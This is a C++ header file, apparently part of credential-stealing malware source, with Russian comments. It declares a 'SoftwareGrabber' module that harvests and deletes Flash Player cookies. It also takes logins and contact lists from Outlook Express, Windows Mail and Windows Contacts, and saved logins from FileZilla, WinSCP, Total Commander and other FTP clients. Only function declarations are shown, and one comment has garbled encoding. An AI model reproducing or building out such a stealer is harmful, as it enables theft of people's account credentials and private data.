#pragma once

namespace SoftwareGrabber
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Поулчение "куков" от Macromedia(Adobe) Flash Player.
  */
  void _getMacromediaFlashFiles(void);

  /*
    Удаление "куков" от Macromedia(Adobe) Flash Player.
  */
  void _removeMacromediaFlashFiles(void);

#if(BO_SOFTWARE_EMAIL > 0)  
  
  /*
    Граббер получателей из Windows Mail/Outlook Express.
  */
  void _emailWindowsMailRecipients(void);
  
  /*
    Граббер логинов из Outlook Express.
    Теряеть актуальность вместе с XP.
  */
  void _emailOutlookExpress(void);

  /*
    Граббер логинов из Windows Mail/Windows Live Mail.

    IN live - true - Windows Live Mail,
              false - Windows Mail.
  */
  void _emailWindowsMail(bool live);
  

  void _emailWindowsAddressBook(void);

 
  void _emailWindowsContacts(void);

  
  void _emailAll(void);
#endif

#if(BO_SOFTWARE_FTP > 0)
  /*
    FlashFXP 3.x.x
  */
  void _ftpFlashFxp3(void);
  
  /*
    CuteFtp 8.x.x
  */
  void _ftpCuteFtp(void);
  
  /*
    Total Commander
  */
  void _ftpTotalCommander(void);
  
  /*
    WsFTP 12.
  */
  void _ftpWsFtp(void);
  
  /*
    FileZilla 3.x.x
  */
  void _ftpFileZilla(void);
  
  /*
    FAR Manager 1.x, 2.x.
  */
  void _ftpFarManager(void);
  
  /*
    WinSCP 4.2.x
  */
  void _ftpWinScp(void);
  
  /*
    FTP Commander 9.2.
  */
  void _ftpFtpCommander(void);
  
  /*
    CoreFTP 2.x.
  */
  void _ftpCoreFtp(void);
  
  /*
    SmartFTP 2, 3, 4.
  */
  void _ftpSmartFtp(void);

  /*В В В В Handling all FTP-clients.

В В В В Requires ComLibrary.
В В */
  void _ftpAll(void);
#endif
};
